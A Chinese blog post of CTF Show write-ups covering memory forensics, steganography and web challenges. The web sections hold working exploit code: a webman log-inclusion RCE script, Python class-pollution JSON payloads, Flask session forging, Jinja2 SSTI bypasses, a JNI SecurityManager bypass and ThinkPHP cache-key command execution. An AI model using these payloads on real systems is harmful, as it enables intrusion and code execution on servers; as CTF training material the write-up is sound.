+++
title = "CTF Show 刷题记录"
author = ["4shen0ne"]
publishDate = 2024-12-08T00:00:00+08:00
tags = ["ctf"]
draft = false
+++

主要是 Web，也会练一下 Misc

<!--more-->


## 单身杯 {#单身杯}


### easy_mem_1 {#easy-mem-1}

用 MemProcFS 分析内存并挂载到 dmp 目录

```text
./memprocfs -device ~/20241029-055419.dmp -mount ~/dmp
```

-   计算机名：dmp/sys/computername.txt
-   IP 地址：dmp/sys/net/netstat.txt
-   build 版本号：dmp/sys/version-build.txt

最终得到 ctfshow{ZHUYUN_S_PC_192.168.26.129_22621}


### easy_mem_2 {#easy-mem-2}

给 MemProcFS 加上 `-forensic 1` 启用 forensic mode

可以找到目录 dmp/forensic/files/ROOT/Users/h/Documents/Tencent Files/54297198 以确认 QQ 号

短剧名和 BV 号都能在浏览器历史 dmp/forensic/web/web.txt 中找到

最终得到 ctfshow{54297198_穿成魔尊后我一心求死_BV1ZU4y1G7AP}


### easy_mem_3 {#easy-mem-3}

翻一下 dmp/sys/proc/proc-v.txt 里的进程信息，看到一个可疑进程

```text
---- Hmohgnsyc.exe           10504   3940 32  U* h                \Device\HarddiskVolume3\Users\h\AppData\Roaming\ToDesk\dev\Hmohgnsyc.exe
                                                                  C:\Users\h\AppData\Roaming\ToDesk\dev\Hmohgnsyc.exe
                                                                  "C:\Users\h\AppData\Roaming\ToDesk\dev\Hmohgnsyc.exe"
                                                                  2024-10-29 05:52:14 UTC ->                     ***
                                                                  Medium
```

这个叫 Hmohgnsyc.exe 的程序放在 ToDesk 的目录里，查看该程序的信息
dmp/name/Hmohgnsyc.exe-10504/modules/Hmohgnsyc.exe/versioninfo.txt:

```text
Company Name:      http://www.jieba.net
File Description:  超级解霸核心组件(升级界面)
File Version:      1, 0, 0, 630
Internal Name:     Update
Legal Copyright:   Copyright 2009 http://www.jieba.net
Original Filename: Update.exe
Product Name:      Update Module
Product Version:   1, 0, 0, 630
```

最后提交：ctfshow{Hmohgnsyc.exe_todesk_jieba.net}


### 没耳朵都可以 {#没耳朵都可以}

mp3 文件帧头部结构中，有一个 original 位用来表示文件是否为原版，详情参考：
<https://www.cnblogs.com/shakin/p/4012780.html>

010Editor 打开文件，根据提示找到以下标志位：

{{< figure src="/ox-hugo/_20241206_154228screenshot.png" >}}

写个脚本将所有标志位提取出来

```python
original = ""
with open("fox01.mp3", "rb") as f:
    content = f.read()
    for i, b in enumerate(content):
        if b == 0xFF and content[i+1] == 0xFB and (content[i+2] in (0xE0, 0xE2)):
            # 将 bytes 转成二进制表示
            binstr = "".join(map(lambda b: f"{b:08b}", content[i:i+4]))
            original += binstr[29]
```

拿到二进制字符串后，通过调整长宽来形成可读的 flag，可以写个脚本将所有可能的长宽组合都生成图片

```python
import os
from PIL import Image

def create_images_from_binary(binstr: str, output_dir: str, max_width=1000):
    os.makedirs(output_dir, exist_ok=True)
    length = len(binstr)
    for width in range(1, max_width + 1):
        # 计算高度，向上取整
        height = (length + width - 1) // width
        image = Image.new("1", (width, height))
        pixels = image.load()

        # 填充像素
        for i in range(length):
            x = i % width
            y = i // width
            pixels[x, y] = int(binstr[i])
        # 剩余像素补0
        for i in range(length, height * width):
            x = i % width
            y = i // width
            pixels[x, y] = 0

        image_path = os.path.join(output_dir, f"img_{width}x{height}.png")
        image.save(image_path)
        print(f"Saved image: {image_path}")

create_images_from_binary(original.strip(), "images")
```

可以从图片 img_301x33.png 中抠出 flag

{{< figure src="/ox-hugo/_20241206_155439screenshot.png" >}}


### 好玩的 PHP {#好玩的-php}

PHP 里一个数字的 md5 值和它的字符串的 md5 值是一样的，即 `md5(123) === md5("123")`

所以答案是：

```php
<?php
class ctfshow {
    private $d = '1';
    private $s = '2';
    private $b = '3';
    private $ctf = 123;
}
$o = new ctfshow();
echo urlencode(serialize($o));
```

也可以用 [INF](https://www.php.net/manual/zh/math.constants.php#constant.inf)：

```php
<?php
class ctfshow {
    private $d = 'I';
    private $s = 'N';
    private $b = 'F';
    private $ctf = INF;
}
$o = new ctfshow();
echo urlencode(serialize($o));
```


### 迷雾重重 {#迷雾重重}

在 IndexController.php 中有几个 test 开头的路由方法，漏洞其实在 testJson 方法中，该方法会读取 JSON 格式的请求参数 data，然后通过 `view('index/view', $data)` 将数据传到模板中渲染

view 方法的实现位于 support/helpers.php

```php
function view(string $template, array $vars = [], string $app = null, string $plugin = null): Response
{
    $request = \request();
    $plugin = $plugin === null ? ($request->plugin ?? '') : $plugin;
    $handler = \config($plugin ? "plugin.$plugin.view.handler" : 'view.handler');
    return new Response(200, [], $handler::render($template, $vars, $app, $plugin));
}
```

从 config/view.php 中可以找到进行模板渲染的 handler 类，继续分析它的 render 方法，发现一处变量覆盖漏洞

{{< figure src="/ox-hugo/_20241206_163918screenshot.png" >}}

基于这个变量覆盖漏洞，我们可以通过以下步骤来执行命令：

1.  枚举 /proc/{i}/cmdline 来获取网站根目录的绝对路径
2.  用 PHP 代码覆盖 `__template_path__` 变量，通过触发异常将代码写入 webman 的日志文件
3.  由于 webman 的日志文件命名相对固定，可以再次通过变量覆盖来包含刚刚写入代码的日志，以此执行代码

将这些步骤通过脚本实现：

```python
from datetime import datetime
import json
import httpx

BASEURL = "https://55b74c3a-f741-41d3-803e-e327476e7f7b.challenge.ctf.show"
URL = f"{BASEURL}/index/testJson"

def get_webroot() -> str:
    with httpx.Client(verify=False) as cli:
        for i in range(1, 100):
            data = json.dumps(
                {"name": "guest", "__template_path__": f"/proc/{i}/cmdline"}
            )
            resp = cli.get(URL, params={"data": data})
            if "start.php" in resp.text:
                return resp.text.split("start_file=")[1][:-11]


def write_payload(webroot: str, cmd: str):
    with httpx.Client(verify=False) as cli:
        data = json.dumps(
            {
                "name": "guest",
                "__template_path__": f"<?php system('{cmd}');?>",
            }
        )
        resp = cli.get(URL, params={"data": data})
        # print(resp.text)

def include_payload(webroot: str):
    with httpx.Client(verify=False) as cli:
        logfile = datetime.now().strftime(r"webman-%Y-%m-%d.log")
        data = json.dumps(
            {"name": "guest", "__template_path__": f"{webroot}/runtime/logs/{logfile}"}
        )
        resp = cli.get(URL, params={"data": data})
        # print(resp.text)

if __name__ == "__main__":
    webroot = get_webroot()

    cmd = "cat /s000ecretF1ag999.txt"
    write_payload(webroot, f"{cmd} > {webroot}/public/stdout.txt")
    include_payload(webroot)

    with httpx.Client(verify=False) as cli:
        cmd_stdout = cli.get(f"{BASEURL}/stdout.txt").text
        print(cmd_stdout)
```


### ez_inject {#ez-inject}

注册登录后看到提示，并且 Cookie 中会设置一个 JWT

```text
你觉得你能爆破出来密钥？我觉得吧不如去试着污染，在哪里呢？
登录还是注册?别忘了注册用户哦
```

那么考点自然是 Python 原型链污染（）和 Flask

tip: 实际上 Python 中并没有原型链这个概念，而是通过[特殊属性/方法](https://docs.python.org/zh-cn/3.13/reference/datamodel.html)达成类似原型链污染的攻击技巧

在注册接口可以通过发送以下数据来篡改 Flask 的 SECRET_KEY，注意需要修改成 JSON 格式，因为需要利用对字典的 merge 操作来“污染原型链”

```json
{"username": "hacker", "password": "qwe123", "__init__": {"__globals__": {"app": {"config": {"SECRET_KEY": "qwe123"}}}}}
```

官方 wp 是像这样修改 SECRET_KEY 来获取管理员权限，但其实可以直接“污染” is_admin

```json
{"username": "hacker", "password": "qwe123", "is_admin": 1}
```

然后修改 JWT 的 is_admin 字段获取管理员权限

```bash
flask-unsign --cookie "{'is_admin': 1, 'username': 'hacker'}" --secret qwe123 --sign
# eyJpc19hZG1pbiI6MSwidXNlcm5hbWUiOiJoYWNrZXIifQ.Z1LH_w.xUsHvKI86GWV5Yw5uFA7Gec99o4
```

拿到管理员权限后可以在 /secret 中看到提示

```text
You can try to inject on "echo"!
```

经过尝试确认 echo 接口存在 SSTI，在注入时不需要外面的大括号，而且 waf 拦截了一些关键字。最终通过以下 payload 拿到 flag：

```text
self['__in''it__']['__glo''bals__']['__buil''tins__']['__imp''ort__']('os').popen('ca''t /flag').read()
```


### ezzz_ssti {#ezzz-ssti}

Jinja2 SSTI，但是限制了 payload 的长度

绕过长度限制可以参考：<https://blog.csdn.net/weixin_43995419/article/details/126811287>

Flask 中有一个全局对象 config，是一个继承于字典的数据类，用来保存一些配置信息，可以通过它的 update 方法将任意对象设置到 config 的属性中。那么，我们就可以将过长的 payload 分段保存到 config 中，并设置一个很短的属性名，以此来绕过长度限制

bypass：

```nil
{{config.update(c=config.update)}}
{{config.update(g="__globals__")}}
{{config.c(f=lipsum[config.g])}}
{{config.c(o=config.f.os)}}
{{config.c(p=config.o.popen)}}
{{config.p("cat /f*").read()}}
```


### 简单的文件上传 {#简单的文件上传}

上传一个执行命令的 jar 包并执行，会得到以下异常信息：

```nil
Exception in thread "main" java.security.AccessControlException: access denied ("java.io.FilePermission" "<>" "execute")
at java.security.AccessControlContext.checkPermission(AccessControlContext.java:472)
at java.security.AccessController.checkPermission(AccessController.java:884)
at java.lang.SecurityManager.checkPermission(SecurityManager.java:549)
at java.lang.SecurityManager.checkExec(SecurityManager.java:799)
at java.lang.ProcessBuilder.start(ProcessBuilder.java:1018)
at java.lang.Runtime.exec(Runtime.java:620)
at java.lang.Runtime.exec(Runtime.java:450)
at java.lang.Runtime.exec(Runtime.java:347)
at org.example.Main.main(Main.java:5)
```

那么显然这题的考点是绕过 Security Manager，经过尝试后可以通过 JNI 来绕过，细节参考：<https://www.anquanke.com/post/id/151398#h3-8>

题目还有两个需要处理的地方：

1.  只能上传 jar 文件，所以要将共享链接库的后缀改一下，并不影响使用
2.  得知道上传目录的位置是 /var/www/html/uploads

将以下两个 Java 文件编译成 jar 包

```java
package org.example;

public class Main {
    public static void main(String[] args) throws Exception {
        NativeCall.exec("cat /secretFlag000.txt");
    }
}
```

```java
package org.example;

public class NativeCall {
    static {
        System.load("/var/www/html/uploads/libNativeCall.jar");
    }
    public native static String exec(String cmd);
}
```

我是直接使用 maven 打包，所以要在 pom.xml 中添加配置

```xml
<build>
    <plugins>
        <plugin>
            <!-- Build an executable JAR -->
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-jar-plugin</artifactId>
            <configuration>
                <archive>
                    <manifest>
                        <mainClass>org.example.Main</mainClass>
                    </manifest>
                </archive>
            </configuration>
        </plugin>
    </plugins>
</build>
```

然后是将恶意 C 代码编译成共享链接库

```c
#include "NativeCall.h"
#include<stdlib.h>

#ifdef __cplusplus
extern "C"
{
#endif


JNIEXPORT jstring JNICALL Java_org_example_NativeCall_exec(
        JNIEnv *env, jclass cls, jstring j_str)
{
    const char *c_str = NULL;
    char buff[128] = { 0 };
    c_str = (*env)->GetStringUTFChars(env, j_str, NULL);
    if (c_str == NULL)
    {
        printf("out of memory.n");
        return NULL;
    }
    system(c_str);  // execute command
    (*env)->ReleaseStringUTFChars(env, j_str, c_str);
    return (*env)->NewStringUTF(env, buff);
}
#ifdef __cplusplus
}
#endif
```

首先要生成 NativeCall 类的头文件，然后用 gcc 编译共享链接库

```shell
# 1. 编译 NativeCall.class
javac src/main/java/org/example/NativeCall.java -d bin
# 2. 生成头文件 NativeCall.h
javah -jni -classpath ./bin -o NativeCall.h org.example.NativeCall
# 3. 编译共享链接库，以 jar 为后缀
gcc -I$JAVA_HOME/include -I$JAVA_HOME/include/linux -fPIC -shared NativeCall.c -o libNativeCall.jar
```

将两个 jar 文件都上传后直接执行就能读到 flag


## 西瓜杯 {#西瓜杯}


### 她说她想结婚 {#她说她想结婚}

附件是周处除三害的截图

{{< figure src="/ox-hugo/_20241207_121225screenshot.png" >}}

起手 binwalk+foremost 拿到藏在图片里的压缩包，压缩包用了伪加密，用 010Editor 搜
deFlags 将所有 9 改成 0 即可解压得到一堆 txt 文件

```shell
❯ eza -l --time-style full-iso
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:27.000000000 +0800 0.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:21.000000000 +0800 1.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:41.000000000 +0800 2.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:27:38.000000000 +0800 3.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:19.000000000 +0800 4.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:36.000000000 +0800 5.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:22.000000000 +0800 6.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:03.000000000 +0800 7.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:24.000000000 +0800 8.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:27:28.000000000 +0800 9.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:39.000000000 +0800 10.txt
.rwxr-xr-x 22k zrquan 2024-06-22 00:52:12.752078000 +0800 flag.txt
.rwxr-xr-x   0 zrquan 2012-05-20 13:14:52.000000000 +0800 tips.txt
```

除了 flag.txt 有一堆意义不明的中文文本，其他文件都是空的，但是明显时间被动过手脚，特别是 tips.txt 的修改时间看到 5201314

首先看 flag.txt，用 bat 看一下内容

{{< figure src="/ox-hugo/_20241207_125343screenshot.png" >}}

从末尾的一堆空白字符可以想到 [SNOW 隐写](https://darkside.com.au/snow/)，而且题目提示了图片中陈桂林的台词是某个
key，那么把台词作为 password 用 SNOW 解密 flag.txt 就可以拿到前半个 flag

{{< figure src="/ox-hugo/_20241207_125802screenshot.png" >}}

再回到剩下的 txt 文件，之前发现它们的时间有蹊跷，那么检查一下它们的时间戳

```shell
❯ eza -l --time-style '+%s'
.rwxr-xr-x   0 zrquan 1314520107 0.txt
.rwxr-xr-x   0 zrquan 1314520101 1.txt
.rwxr-xr-x   0 zrquan 1314520121 2.txt
.rwxr-xr-x   0 zrquan 1314520058 3.txt
.rwxr-xr-x   0 zrquan 1314520099 4.txt
.rwxr-xr-x   0 zrquan 1314520116 5.txt
.rwxr-xr-x   0 zrquan 1314520102 6.txt
.rwxr-xr-x   0 zrquan 1314520083 7.txt
.rwxr-xr-x   0 zrquan 1314520104 8.txt
.rwxr-xr-x   0 zrquan 1314520048 9.txt
.rwxr-xr-x   0 zrquan 1314520119 10.txt
.rwxr-xr-x 22k zrquan 1718988732 flag.txt
.rwxr-xr-x   0 zrquan 1337490892 tips.txt
```

发现时间戳都是以 1314520 开头，而且剩下的数字都 ascii 码表内，我们尝试将其提取出来解码

```python
result = ""
for i in [107,101,121,58,99,116,102,83,104,48,119]:
    result += chr(i)
print(result)
# key:ctfSh0w
```

又拿到一个 key，用在哪里呢？原来最初的 flag.png 中还藏了东西，下图中 `9E97BA2A` 是
OurSecret 加密的特征。OurSecret 是一个文档加密工具，可以将一些私密文件隐藏在其他文件里，需要通过密码来提取，也就是这个 key

{{< figure src="/ox-hugo/_20241207_140211screenshot.png" >}}

直接用 OurSecret 打开 flag.png 会识别不到里面的加密数据，需要将后面 zip 文件的数据(`504B0304` 开头)先删除，然后拿到以下文本：

```nil
JRDEWV2JKIZUKR2KJBCVGWKTJBGEUVSWIVGVIWKHIJGFOWKXJJLE2UK2IVKVES2WJZFEYR2RKZKDES22GJLFKM2DIZEEMSKGINIEUNI=
```

用 CyberChef 的 Magic 模块直接解出 flag

```text
Base32 -> Base32 -> Base64 -> Base64
```

最后得到：ctfshow{W1sh1ng_every0ne_4_happy_time_pl4ying}


### 你是我的眼 {#你是我的眼}

反编译 jar 然后审计 Main.java

```java
public class Main {
   private static final String PART1 = "U2NF9CSUFOTUF9";
   private static final String PART2 = "Xw-";
   private static final String PART3 = "Q1RGU2hvd3tURVNUX0";
   private static final String PART4 = "JBU0";

   public static String customDecode(String input) {
      String standardInput = input.replace('-', '+').replace('_', '/');
      return new String(Base64.getDecoder().decode(standardInput));
   }

   public static void main(String[] args) {
      Scanner scanner = new Scanner(System.in);
      System.out.println("请输入FLAG:");
      String userInput = scanner.nextLine();
      String flag = "Q1RGU2hvd3tURVNUX0JBU0U2NF9CSUFOTUF9Xw-";
      String decodedFlag = customDecode(flag);
      String cleanInput = userInput.replace("_", "").replace("\u000f", "");
      if (checkflag(cleanInput, decodedFlag)) {
         System.out.println("flag正确");
      } else {
         System.out.println("输入错误");
      }

      scanner.close();
   }

   private static boolean checkflag(String input, String CTFflag) {
      return CTFflag.replace("_", "").replace("\u000f", "").equals(input);
   }
}
```

官方 wp 中出题的思路应该是比较复杂的，但其实直接 base64 解码 flag 变量就完事了...

```shell
❯ echo 'Q1RGU2hvd3tURVNUX0JBU0U2NF9CSUFOTUF9Xw-' | base64 -d
CTFShow{TEST_BASE64_BIANMA}_base64: invalid input
```

提交 CTFShow{TEST_BASE64_BIANMA}


### CodeInject {#codeinject}

签到题，直接执行代码

```text
http --verify no -f https://2db56ea5-d48e-469f-ae42-194cc9bd7a06.challenge.ctf.show/ 1="system('cat /000f1ag.txt')"
```


### tpdoor {#tpdoor}

题目提供的代码很有限，只知道可以通过 isCache 参数控制 request_cache_key 配置项

先通过路由错误确认 ThinkPHP 的版本为 V8.0.3

```text
https://acf3a4dd-e196-4d00-ba5a-4443ee775efb.challenge.ctf.show/?s=foo
```

然后需要审计一下 ThinkPHP 源码，既然可以控制缓存机制的 key，题目代码中也启用了检查缓存的中间件 [CheckRequestCache](https://github.com/top-think/framework/blob/v8.0.3/src/think/middleware/CheckRequestCache.php)，就从它入手

审计代码可以发现漏洞存在于 parseCacheKey 方法，[L152](https://github.com/top-think/framework/blob/5e59fb1e2bcb400c6f82e99d1a40dd058afc8563/src/think/middleware/CheckRequestCache.php#L152) 以 `|` 分割 key，然后将后面部分赋值给 `$fun` 。之后没有经过任何安全过滤，在 [L178](https://github.com/top-think/framework/blob/5e59fb1e2bcb400c6f82e99d1a40dd058afc8563/src/think/middleware/CheckRequestCache.php#L178) 把 `$fun` 作为函数执行，而参数就是分割后的前面部分

so

```shell
http -b bd7550d8-af8b-4361-9bad-e169fd8ec931.challenge.ctf.show isCache=='ls /|system' cacheTime==5
http -b bd7550d8-af8b-4361-9bad-e169fd8ec931.challenge.ctf.show isCache=='cat /000f1ag.txt|system' cacheTime==5
```

<details>
<summary>tips</summary>
<div class="details">

1.  如果你已经触发了缓存而且没设置 cacheTime，重启容器吧，不然一个小时后才会刷新缓存
2.  拿不到结果可以多刷新几次页面
</div>
</details>


### easy_polluted {#easy-polluted}

Python 的原型污染，需要绕过黑名单，而且黑名单中有下划线，估计就是编码绕过了

```python
def filter(user_input):
    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string']
    for pattern in blacklisted_patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True
    return False
```

审计代码可以看到会先用 `filter` 函数检查黑名单，然后用 `json.loads` 解析 JSON 数据，而按照 JSON 的规范，遇到 `\u` 开头的 unicode 转义序列是会自动解析成 unicode 字符的

```python
@app.route('/',methods=['POST'])
def index():
    username = request.form.get('username')
    password = request.form.get('password')
    session["username"] = username
    session["password"] = password
    Evil = evil()
    if request.data:
        if filter(str(request.data)):
            return "NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"
        else:
            merge(json.loads(request.data), Evil)
            return "MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"
    return render_template("index.html")

@app.route('/admin',methods=['POST', 'GET'])
def templates():
    username = session.get("username", None)
    password = session.get("password", None)
    if username and password:
        if username == "adminer" and password == app.secret_key:
            return render_template("flag.html", flag=open("/flag", "rt").read())
        else:
            return "Unauthorized"
    else:
        return f'Hello,  This is the POLLUTED page.'
```

另外，flag.html 中用的并不是 jinja 的默认语法

```html
<body>
    这又是什么jinja语法啊！
    [#flag#]
</body>
```

所以需要以下几步来拿 flag

1.  通过原型污染修改 SECRET_KEY
2.  通过原型污染修改 jinja_env，以修改引用变量的语法
3.  用 unicode 转义序列绕过黑名单检查
    ```json
    {"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f": {"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f": {"\u0061\u0070\u0070": {"config": {"SECRET\u005fKEY": "ctfshow"}, "\u006a\u0069\u006e\u006a\u0061\u005f\u0065\u006e\u0076": {"\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0073\u0074\u0061\u0072\u0074\u005f\u0073\u0074\u0072\u0069\u006e\u0067": "[#","\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0065\u006e\u0064\u005f\u0073\u0074\u0072\u0069\u006e\u0067": "#]"}}}}}
    ```
4.  使用和 SECRET_KEY 相同的密码登录会话，访问 /admin

    ```text
    flask-unsign --cookie "{'password': 'ctfshow', 'username': 'adminer'}" --secret ctfshow --sign
    ```


## 未完持续... {#未完持续-dot-dot-dot}
